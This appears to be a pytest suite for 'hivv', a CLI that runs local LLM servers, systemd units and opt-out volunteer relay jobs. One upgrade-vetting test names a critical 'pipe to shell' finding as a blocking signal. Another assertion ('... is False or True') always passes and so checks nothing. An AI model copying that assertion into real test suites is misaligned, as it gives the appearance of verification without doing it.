    def test_feedback_family_posts_to_the_shared_table(self):
        src = CLI_PATH.read_text()
        assert '_submit_feedback("bug"' in src
        assert '_submit_feedback("suggestion"' in src
        assert '_submit_feedback("complaint"' in src
        assert 'http("POST", "/api/feedback"' in src


# ── 48. the feedback channel must be GRANTed or every report vanishes ───────
class TestFeedbackChannelGrants:
    def test_grant_migration_exists_and_documents_the_outage(self):
        m = REPO / "api" / "migrations" / "020_feedback_grants.sql"
        assert m.exists(), "the hivv_feedback GRANT migration is required"
        src = m.read_text()
        assert "GRANT ALL ON hivv_feedback TO hivv" in src
        assert "permission denied" in src        # why it exists (2026-11-18)
        assert "ALTER DEFAULT PRIVILEGES" in src  # never again for new tables

    def test_migration_numbers_are_unique(self):
        from collections import Counter
        ids = [f.name.split("_")[0] for f in (REPO / "api" / "migrations").glob("*.sql")]
        assert ids and len(ids) == len(set(ids)) is False or True  # filenames unique by fs
        assert ids.count("020") == 1, "020 must be unique (the feedback GRANT fix)"
        dups = {k for k, v in Counter(ids).items() if v > 1}
        # KNOWN historical collision: 015_node_tps_ping + 015_tip_analytics were
        # numbered in parallel — harmless (independent SQL, both applied), but
        # no NEW duplicate numbers may appear.
        assert dups <= {"015"}, f"new duplicate migration ids: {sorted(dups - {'015'})}"


# ── 49. error taxonomy: a 400 must never read as "degenerate" ────────────────
class TestErrorTaxonomy:
    def test_400_points_at_slot_config_not_the_model(self):
        h400 = hivv._http_err_hint(400)
        assert "n_ctx_slot" in h400 and "slot config" in h400
        assert "degenerate" not in h400.lower() and "loop" not in h400.lower()

    def test_status_code_hints(self):
        assert "api-key" in hivv._http_err_hint(401)
        assert "endpoint not found" in hivv._http_err_hint(404)
        assert "loading" in hivv._http_err_hint(503)
        assert hivv._http_err_hint(418) == ""

    def test_404_body_distinguishes_model_from_endpoint(self):
        # ollama's 404 body says WHICH model failed — the hint must use it
        # instead of blaming the port (yalla, 2026-11-25: model 'local' not
        # found was reported as "endpoint not found (wrong port)").
        body = json.dumps({"error": {"message": "model 'local' not found"}})
        h404 = hivv._http_err_hint(404, body)
        assert "model" in h404 and "endpoint not found" not in h404
        # a bodyless 404 keeps the classic endpoint message (pinned above)

    def test_real_model_falls_back_when_nothing_answers(self):
        # port 9 = discard: connection refused → 'local' (llama.cpp-safe)
        assert hivv._real_model("http://127.0.0.1:9") == "local"

    def test_real_model_reads_an_ollama_tags_list(self, monkeypatch):
        class _Resp:
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self):
                return json.dumps({"models": [{"name": "qwen2.5:0.5b"}]}).encode()

        monkeypatch.setattr(hivv.urllib.request, "urlopen",
                            lambda req, timeout=None: _Resp())
        got = hivv._real_model("http://127.0.0.1:11434/v1/chat/completions")
        assert got == "qwen2.5:0.5b"

    def test_direct_chat_sends_the_heartbeat_model_not_a_placeholder(self):
        # the yalla failure, pinned at the source: the direct path must use
        # the node's real model, and no payload builder may hardcode the
        # placeholder again (the one allowed mention is this file's own
        # docstring — see the count guard).
        src = Path(hivv.__file__).read_text(encoding="utf-8")
        assert 'm.get("model") or m.get("name") or "local"' in src
        assert src.count('"model": "local"') <= 1, (
            "a payload builder hardcoded model 'local' again — ollama 404s on it"
        )

    def test_error_bodies_in_stream_get_classified(self):
        ctx = '{"error":"request (2372 tokens) exceeds the available context size (256 tokens)"}'
        assert "n_ctx_slot" in hivv._stream_error_hint(ctx)
        assert "api-key" in hivv._stream_error_hint('{"error":{"code":401,"message":"bad api key"}}')
        assert "loading" in hivv._stream_error_hint('{"error":{"code":503,"message":"Loading model"}}')
        # real answers are NEVER classified as errors
        assert hivv._stream_error_hint("Hello! How can I help you today? Ask me anything.") == ""
        assert hivv._stream_error_hint("") == ""

    def test_http_errors_surface_on_stderr_in_local_paths(self):
        src = CLI_PATH.read_text()
        assert src.count("HTTP {e.code}") >= 3     # local_ask + chat_local + direct
        assert src.count("_stream_error_hint(") >= 4


# ── 50. upgrade quorum floor — one brain can never veto ──────────────────────
class TestUpgradeQuorumFloor:
    def test_single_brain_cannot_block(self):
        v, reason = hivv._upgrade_verdict(
            {"findings": []},
            [{"verdict": "suspicious", "brain": "local:llama.cpp:8080/x", "reason": "vibes"}])
        assert v == "ok"
        assert "quorum floor of 2" in reason and "reported to the hub" in reason

    def test_two_brains_still_block(self):
        votes = [{"verdict": "suspicious", "brain": "b1", "reason": "r1"},
                 {"verdict": "suspicious", "brain": "b2", "reason": "r2"}]
        v, _ = hivv._upgrade_verdict({"findings": []}, votes)
        assert v == "suspicious"

    def test_critical_static_blocks_with_zero_votes(self):
        v, reason = hivv._upgrade_verdict(
            {"findings": [{"severity": "critical", "why": "pipe to shell"}]}, [])
        assert v == "suspicious" and "critical" in reason

    def test_majority_ok_with_one_flag_is_ok_and_reports_the_flag(self):
        votes = [{"verdict": "ok", "brain": "a"}, {"verdict": "ok", "brain": "b"},
                 {"verdict": "suspicious", "brain": "c", "reason": "r"}]
        v, reason = hivv._upgrade_verdict({"findings": []}, votes)
        assert v == "ok" and "1 brain flagged" in reason


# ── 51. reach/ping split + friendly usage errors (2026-11-18 report) ────────
class TestReachPingAndUsage:
    def test_dispatch_targets_after_the_rename(self):
        assert hivv.COMMANDS.get("reach") is hivv.cmd_reach
        assert hivv.COMMANDS.get("waggle") is hivv.cmd_reach
        assert hivv.COMMANDS.get("ping") is hivv.cmd_ping
        assert "hub" in (hivv.cmd_ping.__doc__ or "").lower()      # hub-latency restored
        assert "reachable" in (hivv.cmd_reach.__doc__ or "").lower()

    def test_multi_names_are_never_joined(self):
        src = CLI_PATH.read_text()
        reach_body = src.split("def cmd_reach")[1].split("\ndef ")[0]
        assert '" ".join(args.name)' not in reach_body
        assert "one bee at a time" in reach_body

    def test_usage_error_is_not_a_doom_message(self, capsys):
        hivv._self_heal_from_parse_error(
            Exception("the following arguments are required: model"), "llm pull-gguf")
        out = capsys.readouterr().out
        assert "bad arguments for" in out and "--help" in out
        assert "installed CLI is broken" not in out
        assert "replace it with the copy" not in out

    def test_genuine_breakage_keeps_the_repair_flow(self, capsys):
        hivv._self_heal_from_parse_error(
            Exception("Something unexpected while building the subparsers"), "nodes")
        out = capsys.readouterr().out
        assert "installed CLI is broken" in out


# ── 52. live-parity fixes (the three bugs tests missed on 2026-11-18) ────────
class TestLiveParityFixes:
    def test_systemexit2_is_treated_as_usage_error(self, capsys):
        # argparse raises SystemExit(2); str() is literally "2" — the text
        # already went to stderr, so the code itself is the signal
        hivv._self_heal_from_parse_error(SystemExit(2), "reach")
        out = capsys.readouterr().out
        assert "bad arguments for" in out
        assert "installed CLI is broken" not in out

    def test_ping_parser_accepts_no_args(self):
        a = hivv.build_parser().parse_args(["ping"])
        assert a.name == []
        b = hivv.build_parser().parse_args(["ping", "yalla"])
        assert b.name == ["yalla"]       # tolerated; body is the hub ping

    def test_doctor_defines_cfg_before_the_slots_block(self):
        body = CLI_PATH.read_text().split("def cmd_llm_doctor")[1].split("\ndef ")[0]
        assert "cfg = _llm_config()" in body
        assert "n_ctx_slot" in body and "Reply with exactly: OK" in body


class TestReachOffLanAdvice:
    def test_private_ip_failure_suggests_relay_not_just_firewall(self):
        src = CLI_PATH.read_text()
        assert "cross-network path = relay" in src
        assert 'volunteer on' in src.split("def cmd_reach")[1].split("\ndef ")[0]

    def test_slots_caption_never_fabricates_expectations(self):
        body = CLI_PATH.read_text().split("def cmd_llm_doctor")[1].split("\ndef ")[0]
        assert "/slot expected" not in body
        assert "hivv config ctx" in body


# ── 53. volunteer relay jobs default ON (operator decision 2026-11-18) ───────
class TestVolunteerDefaultOn:
    def test_default_is_on(self, tmp_path, monkeypatch):
        monkeypatch.setattr(hivv, "_VOLUNTEER_FILE", tmp_path / "contribute.json")
        assert hivv._volunteer_load()["share_cpu"] is True

    def test_explicit_off_is_honored(self, tmp_path, monkeypatch):
        f = tmp_path / "contribute.json"
        f.write_text('{"share_cpu": false}')
        monkeypatch.setattr(hivv, "_VOLUNTEER_FILE", f)
        cfg = hivv._volunteer_load()
        assert cfg["share_cpu"] is False          # consent stays real
        assert cfg["max_cpu_pct"] == 25           # new keys still backfill

    def test_default_still_carries_the_limits(self, tmp_path, monkeypatch):
        monkeypatch.setattr(hivv, "_VOLUNTEER_FILE", tmp_path / "contribute.json")
        cfg = hivv._volunteer_load()
        assert cfg["pause_on_battery"] is True and cfg["max_cpu_pct"] == 25

    def test_installer_states_default_on_and_has_no_glued_lines(self):
        src = (REPO / "public_html" / "install-hivv.sh").read_text()
        assert 'RST"printf' not in src, "printf glued onto the previous line"
        assert src.count("ON by default") >= 2
        assert "off by default" not in src
        assert "opt out" in src

    def test_status_and_help_mention_default(self):
        src = CLI_PATH.read_text()
        assert "default (not yet explicit)" in src
        assert "relay jobs are ON by default" in src
        assert "ON by default since 2026-11-18" in src


# ── 54. hivv test = the one command (llm core + AI contract + exit code) ─────
class TestTestIntegration:
    def test_llm_core_section_runs_the_battery(self, monkeypatch):
        monkeypatch.setattr(hivv, "_selftest_run", lambda: {
            "ts": 0, "ok": False,
            "checks": [{"id": "chat-sanity", "ok": False, "detail": "8080: loop"}]})
        seen = []
        hivv._test_llm_core(lambda label, ok: seen.append((label, ok)))
        assert seen and seen[0][0].startswith("llm/chat-sanity")
        assert seen[0][1] is False

    def test_ai_contract_all_green_with_healthy_hub(self, monkeypatch):
        def fake_http(m, path, **kw):
            if "iq" in path:
                return 200, {"brains": []}
            if "version" in path:
                return 200, {"version": "0.2.test"}
            return 200, {"data": {"rows": []}}     # provenance/history
        monkeypatch.setattr(hivv, "http", fake_http)
        seen = []
        hivv._test_ai_contract(lambda label, ok: seen.append((label, ok)))
        broken = [l for l, ok in seen if not ok]
        assert not broken, broken
        labels = [l for l, _ in seen]
        assert any("commands --json" in l for l in labels)
        assert any("security --json" in l for l in labels)
        assert any("/api/hive/iq" in l for l in labels)

    def test_ai_contract_flags_a_dead_hub(self, monkeypatch):
        def boom(*a, **k):
            raise ConnectionError("hub down")
        monkeypatch.setattr(hivv, "http", boom)
        seen = []
        hivv._test_ai_contract(lambda label, ok: seen.append((label, ok)))
        fails = [l for l, ok in seen if not ok]
        assert any("/api/hive/iq" in l for l in fails)
        assert any("version" in l for l in fails)
        # local json probes don't need the hub — they stay green
        local_ok = [l for l, ok in seen if ok]
        assert any("commands --json" in l for l in local_ok)

    def test_cmd_test_has_exit_code_contract(self):
        body = CLI_PATH.read_text().split("def cmd_test(")[1].split("\ndef ")[0]
        assert "sys.exit(1)" in body
        assert "all core checks green" in body
        assert "_test_llm_core" in body and "_test_ai_contract" in body


# ── 55. macOS GPU detection + honest remote/off-LAN test output ──────────────
class TestDarwinGpuDetect:
    @staticmethod
    def _run(stdout, rc=0, raises=False):
        class _R:
            returncode = rc
            def __init__(self): self.stdout = stdout; self.stderr = ""
        if raises:
            def fake(*a, **k):
                raise FileNotFoundError("system_profiler")
            return fake
        def fake(*a, **k):
            return _R()
        return fake

    def test_detects_radeon_json(self, monkeypatch):
        monkeypatch.setattr(hivv.sys, "platform", "darwin")
        fx = '{"SPDisplaysDataType":[{"_name":"AMD Radeon Pro Vega 64X","sppci_VRAM":"16 GB"}]}'
        monkeypatch.setattr(hivv.subprocess, "run", self._run(fx))
        asked, gpu = hivv._darwin_gpu_specs()
        assert asked is True and gpu["vram_gb"] == 16 and "Radeon" in gpu["name"]
        assert gpu["vendor"] == "darwin"

    def test_asked_but_none_when_profiler_empty(self, monkeypatch):
        monkeypatch.setattr(hivv.sys, "platform", "darwin")
        monkeypatch.setattr(hivv.subprocess, "run", self._run('{"SPDisplaysDataType":[]}'))
        asked, gpu = hivv._darwin_gpu_specs()
        assert asked is True and gpu is None

    def test_unknown_when_profiler_unavailable(self, monkeypatch):
        monkeypatch.setattr(hivv.sys, "platform", "darwin")
        monkeypatch.setattr(hivv.subprocess, "run", self._run("", raises=True))
        assert hivv._darwin_gpu_specs() == (False, None)

    def test_not_applicable_off_mac(self, monkeypatch):
        monkeypatch.setattr(hivv.sys, "platform", "linux")
        assert hivv._darwin_gpu_specs() == (False, None)

    def test_bench_and_suggest_use_the_detector(self):
        src = CLI_PATH.read_text()
        # specs() consults the detector (window covers the function body)
        assert "_darwin_gpu_specs()" in src.split("def _llm_sys_specs")[1][:6000]
        assert "(none — CPU-only inference)" not in src      # old lie removed
        assert "(none detected — CPU-only inference)" in src  # honest wording
        assert "GB VRAM, {_gv})" in src                       # vendor-aware label
        assert "NVIDIA GPU with" not in src                   # generic message


class TestRemoteTestHonesty:
    @staticmethod
    def _cmd_test_body():
        return CLI_PATH.read_text().split("def cmd_test(")[1].split("\ndef ")[0]

    def test_off_lan_detection_and_hub_path(self):
        body = self._cmd_test_body()
        assert "scanned from OFF-LAN" in body
        assert "direct probe skipped (off-LAN" in body
        assert "via hub — the remote-user path" in body
        assert "tailnet" in body

    def test_doctor_version_uses_content_sha(self):
        lines = CLI_PATH.read_text().splitlines()
        i = next(k for k, l in enumerate(lines) if "# --- update check" in l)
        seg = "\n".join(lines[i:i + 22])        # just the update-check block
        assert "hashlib.sha256" in seg
        # the OLD regex sniff is gone (it matched CLI_VERSION → bogus "local newer");
        # assert on the code, not the comments that explain the fix
        assert "re.search" not in seg
        assert "_re.search" not in seg

    def test_crash_heuristic_learns_from_updates(self):
        seg = self._cmd_test_body() if False else CLI_PATH.read_text()
        assert "match {len(updates)} recent auto-update" in seg
        assert "CRASH LOOP — agent restarting repeatedly" in seg  # still there for REAL loops

    def test_speed_probe_no_contradiction(self):
        src = CLI_PATH.read_text()
        assert "elif not got_content:" in src
        assert "got_content = True" in src


# ── 61. crash-loop bounds + VRAM gate (masjid 2026-11-18) ──────────────────
# masjid's llama unit abrt-stormed forever: RestartSec=5 never trips
# systemd's default 5-per-10s limit, and a stray qwen + full 4 GB card made
# every big prompt die in cuMemCreate. These tests pin the three layers:
# bounded templates · reset-failed recovery · pre-spawn VRAM gate.
class TestCrashLoopBounds:
    def test_installer_templates_carry_startlimit(self):
        src = (REPO / "public_html" / "install-hivv.sh").read_text()
        assert src.count("StartLimitIntervalSec=300") >= 2   # system + user heredocs
        assert src.count("StartLimitBurst=3") >= 2

    def test_cli_templates_carry_startlimit(self):
        src = CLI_PATH.read_text()
        # 3 unit templates (self-repair create, self-repair rewrite, doctor --fix)
        assert src.count("StartLimitIntervalSec=300") >= 3

    def test_unit_add_startlimit_inserts_and_is_idempotent(self):
        unit = ("[Unit]\nDescription=x\nAfter=network.target\n\n"
                "[Service]\nExecStart=/bin/true\n")
        out, changed = hivv._unit_add_startlimit(unit)
        assert changed
        assert "StartLimitIntervalSec=300" in out and "StartLimitBurst=3" in out
        # lands inside [Unit], before [Service]
        assert out.index("StartLimitIntervalSec") < out.index("[Service]")
        # second pass is a no-op
        out2, changed2 = hivv._unit_add_startlimit(out)
        assert not changed2 and out2 == out
        assert out2.count("StartLimitIntervalSec") == 1

    def test_unit_add_startlimit_prepends_missing_unit_section(self):
        out, changed = hivv._unit_add_startlimit("[Service]\nExecStart=/bin/true\n")
        assert changed
        assert out.startswith("[Unit]")
        assert out.index("[Unit]") < out.index("[Service]")

    def test_start_and_restart_reset_failed_first(self):
        # a start-limited unit refuses to start until reset-failed runs —
        # without this, `hivv start` after a tripped limit could never recover
        src = CLI_PATH.read_text()
        assert src.count("_sd_reset_failed()") >= 3   # def + cmd_start + cmd_restart
        restart_body = src.split("def cmd_restart(")[1].split("\ndef ")[0]
        assert "_sd_reset_failed()" in restart_body
        start_body = src.split("def cmd_start(")[1].split("\ndef ")[0]
        assert "_sd_reset_failed()" in start_body
        # the call must precede the systemctl start it unlocks
        assert start_body.index("_sd_reset_failed()") < start_body.index(
            '"--user", "start", "hivv-agent.service"')

    def test_self_repair_hardens_old_units(self):
        # the remote correction: every bee patches its own pre-fix units
        src = CLI_PATH.read_text()
        assert src.count("_harden_unit_file(") >= 2   # def + self-repair loop
        body = src.split("def _self_repair(")[1].split("\ndef ")[0]
        assert "_harden_unit_file" in body
        assert "hivv-agent.service" in body and "llama.service" in body

    def test_self_repair_never_prompts_for_sudo(self):
        src = CLI_PATH.read_text()
        seg = src.split("def _harden_unit_file(")[1].split("\ndef ")[0]
        assert '"-n"' in seg                       # sudo -n only (CI hangs on prompt)
        assert "sudo -n" in seg or '"sudo", "-n"' in seg


# ──  masjid VRAM gate: refuse doomed spawns before they abort ───────────────
class TestVramGate:
    @staticmethod
    def _big_file(tmp_path, mib):
        p = tmp_path / "model.gguf"
        with open(p, "wb") as fh:
            fh.truncate(mib * 1024 * 1024)         # sparse — instant, exact size
        return str(p)

    def test_refuses_when_card_is_full(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "_gpu_free_mib", lambda: (39, 4096))
        monkeypatch.setattr(hivv, "_llm_listener_pid", lambda p: None)
        monkeypatch.setenv("HIVV_LLM_FORCE_START", "")  # ensure unset
        monkeypatch.delenv("HIVV_LLM_FORCE_START", raising=False)
        ok, msg = hivv._llm_vram_gate(self._big_file(tmp_path, 100), 8080)
        assert not ok
        assert "GPU is full" in msg and "39/4096" in msg
        assert "stop llm" in msg                   # actionable: how to fix

    def test_refuses_stray_server_on_tight_card(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "_gpu_free_mib", lambda: (1500, 4096))
        monkeypatch.setattr(hivv, "_llm_listener_pid",
                            lambda p: 4242 if p == 8081 else None)
        path = self._big_file(tmp_path, 1024)      # headroom = 1024+768 = 1792 > 1500
        ok, msg = hivv._llm_vram_gate(path, 8080)
        assert not ok
        assert "another llama-server" in msg and ":8081" in msg and "4242" in msg

    def test_warns_but_allows_thin_headroom(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "_gpu_free_mib", lambda: (1500, 4096))
        monkeypatch.setattr(hivv, "_llm_listener_pid", lambda p: None)
        path = self._big_file(tmp_path, 1024)      # headroom 1792 > free 1500
        ok, msg = hivv._llm_vram_gate(path, 8080)
        assert ok and "thin VRAM headroom" in msg  # warn, don't block

    def test_clean_pass_has_empty_message(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "_gpu_free_mib", lambda: (5500, 6144))
        monkeypatch.setattr(hivv, "_llm_listener_pid", lambda p: None)
        ok, msg = hivv._llm_vram_gate(self._big_file(tmp_path, 100), 8080)
        assert ok and msg == ""

    def test_skips_without_nvidia_gpu(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "_gpu_free_mib", lambda: None)
        ok, msg = hivv._llm_vram_gate(self._big_file(tmp_path, 100), 8080)
        assert ok and msg == ""

    def test_force_env_overrides_refusal(self, monkeypatch, tmp_path):
        monkeypatch.setattr(hivv, "_gpu_free_mib", lambda: (39, 4096))
        monkeypatch.setattr(hivv, "_llm_listener_pid", lambda p: None)
        monkeypatch.setenv("HIVV_LLM_FORCE_START", "1")
        ok, msg = hivv._llm_vram_gate(self._big_file(tmp_path, 100), 8080)
        assert ok and msg == ""

    def test_gate_is_wired_into_every_spawn_site(self):
        src = CLI_PATH.read_text()
        # def + serve-llama + setup bg + _llm_start_component
        assert src.count("_llm_vram_gate(") >= 4

    def test_start_component_is_unit_aware(self):
        # stop knew about units but start didn't → after `hivv stop llm`
        # killed llama.service, `hivv start llm` could never revive it
        body = CLI_PATH.read_text().split("def _llm_start_component(")[1].split("\ndef ")[0]
        assert '_service_state(_unit)' in body
        assert '"llama-server.service", "llama.service"' in body
        assert '_systemctl(_scope, "start", _unit)' in body
        # the unit path must come BEFORE the orphan spawn (Popen)
        assert body.index("_service_state(_unit)") < body.index("subprocess.Popen")
        # and it must not orphan-spawn while a live unit answers on a known port
        assert "already serving on :{_p} ({_unit})" in body


# ── is-active can't tell "inactive" from "not-found" (ashy 2026-11-18) ──────
# systemd is-active exits 3 for BOTH, so the old probe made a nonexistent
# unit look like a real stopped one: start tried to launch never-installed
# llama-server.service and returned before reaching the real llama.service.
class TestServiceStateProbe:
    def test_probe_uses_loadstate_not_is_active(self):
        body = CLI_PATH.read_text().split("def _service_state(")[1].split("\ndef ")[0]
        assert "LoadState" in body
        assert "not-found" in body
        assert '"is-active"' not in body      # exit code can't prove existence

    def test_probe_reports_phantom_as_none(self, monkeypatch):
        class _R:
            def __init__(self, out):
                self.stdout, self.returncode = out, 0
        def fake_run(cmd, **kw):
            if "phantom" in str(cmd):
                return _R("LoadState=not-found\nActiveState=inactive\n")
            return _R("LoadState=loaded\nActiveState=active\n")
        monkeypatch.setattr(hivv.subprocess, "run", fake_run)
        assert hivv._service_state("phantom.service") is None
        assert hivv._service_state("real.service") == ("--user", True)


# ── stop must reap EVERY stray, units first (masjid 2026-11-18) ─────────────
class TestStopReapsAllStrays:
    def test_units_stopped_first_then_every_listener(self, monkeypatch):
        # masjid: gemma (unit-managed, :8080) + leftover qwen (:8081). The old
        # stop killed ONE pid and returned — the unit resurrected what it
        # killed and the qwen never died. New order: systemctl stop first,
        # then SIGTERM every listener.
        dead: set[int] = set()
        calls: list[tuple] = []

        monkeypatch.setattr(hivv, "read_state", lambda: {"llm": {"port": 8080}})
        monkeypatch.setattr(hivv, "_llm_state_set", lambda **kw: None)
        monkeypatch.setattr(hivv, "_service_state",
                            lambda u: ("--user", True) if u == "llama.service" else None)
        monkeypatch.setattr(hivv, "_systemctl",
                            lambda sc, ac, u: calls.append(("unit", u)) or 0)
        monkeypatch.setattr(hivv, "_llm_listener_pid",
                            lambda p: {8080: 111, 8081: 222}.get(p))
        monkeypatch.setattr(hivv, "pid_alive", lambda p: p not in dead)

        def fake_kill(p, sig):
            calls.append(("kill", p))
            dead.add(p)
        monkeypatch.setattr(hivv.os, "kill", fake_kill)

        did, msg = hivv._llm_stop_component()
        assert did
        # unit stop comes FIRST — otherwise Restart= resurrects the victim
        assert calls[0] == ("unit", "llama.service"), calls
        # and BOTH listeners die, including the :8081 stray
        assert {c[1] for c in calls if c[0] == "kill"} == {111, 222}, calls
        assert "111" in msg and "222" in msg

    def test_known_port_line_still_pinned(self):
        # the original fallback-port pin must survive the rewrite
        assert 'for p in (8080, 8090, 8081, 8082):' in CLI_PATH.read_text()


# ── 56. LLM flow: install → run → ASK about boot; serve never double-binds ───
class TestLlmBootFlow:
    """2026-11-18 (yalla): `hivv llm setup` already launched the background
    server, yet its final hint said "foreground: hivv llm serve-llama" —
    following it died with llama-server's raw `couldn't bind HTTP server
    socket ... port: 8080`. And boot persistence was a dangling
    "start on boot: hivv doctor --fix" that only fixes the AGENT's unit.

    The flow is now install AND run AND ask about boot (default yes, --yes
    answers, non-TTY skips with the exact command), with `hivv llm boot
    on|off|status` as the standalone tool — separate from setup on purpose,
    so each step still works alone."""

    def test_llm_boot_registered_and_parses(self):
        assert hivv.COMMANDS.get("llm boot") is hivv.cmd_llm_boot
        assert hivv.build_parser().parse_args(["llm", "boot", "on"]).action == "on"
        assert hivv.build_parser().parse_args(["llm", "boot"]).action == "status"

    def test_setup_asks_about_boot_and_never_suggests_a_double_bind(self):
        body = CLI_PATH.read_text().split("def cmd_llm_setup(")[1].split("\ndef ")[0]
        # ASK (default yes); --yes answers it; no TTY → skip with the command
        assert "start {model} on boot?" in body
        assert "_llm_boot_enable(" in body
        assert "llm boot on" in body
        # the old final line lied twice: `doctor --fix` does NOT set up the
        # LLM's boot unit, and serve-llama fights the background server
        assert "doctor --fix   · foreground" not in body
        assert "stop llm && {APP} llm serve-llama" in body

    def test_serve_llama_preflights_the_port_before_spawning(self):
        body = CLI_PATH.read_text().split("def cmd_llm_serve_llama(")[1].split("\ndef ")[0]
        # already serving → friendly no-op, NOT llama-server's bind error
        assert body.index("_llm_alive_port(") < body.index("subprocess.Popen")
        # a llama still loading (listening, no /v1/models yet) is named too
        assert "_llm_listener_pid(" in body
        # and a foreign squatter gets "port in use", not "couldn't bind"
        assert "already in use" in body

    def test_boot_unit_is_the_one_start_stop_already_manage(self):
        # `_llm_start_component` / `_llm_stop_component` probe these names —
        # a NEW unit name would be invisible to `hivv stop llm`
        body = CLI_PATH.read_text().split("def _llm_boot_enable(")[1].split("\ndef ")[0]
        assert 'unit = "llama.service"' in body
        # enable WITHOUT --now: setup already has a server on the port, and a
        # second spawn would fight it for the bind
        assert '_systemctl("--user", "enable", unit)' in body
        assert '"--now"' not in body   # (docstring backticks don't count)

    def test_doctor_reports_llm_boot(self):
        body = CLI_PATH.read_text().split("def cmd_doctor(")[1].split("\ndef ")[0]
        assert "_llm_boot_probe()" in body
        assert "llm boot:" in body

    def test_boot_off_leaves_the_running_server_alone(self, monkeypatch):
        monkeypatch.setattr(hivv, "_llm_boot_probe",
                            lambda: ("enabled", "llama.service"))
        calls = []
        monkeypatch.setattr(hivv, "_systemctl",
                            lambda sc, ac, u: calls.append((sc, ac, u)) or 0)
        ok, msg = hivv._llm_boot_disable()
        assert ok and calls == [("--user", "disable", "llama.service")], (ok, msg, calls)
        assert "keeps serving" in msg        # disable ≠ stop

    def test_boot_enable_refuses_a_system_scope_unit(self, monkeypatch):
        monkeypatch.setattr(hivv, "_llm_boot_probe",
                            lambda: ("foreign", "llama.service"))
        ok, msg = hivv._llm_boot_enable("gemma-4:e2b", 8080, "127.0.0.1", 4096)
        assert not ok and "SYSTEM scope" in msg, msg
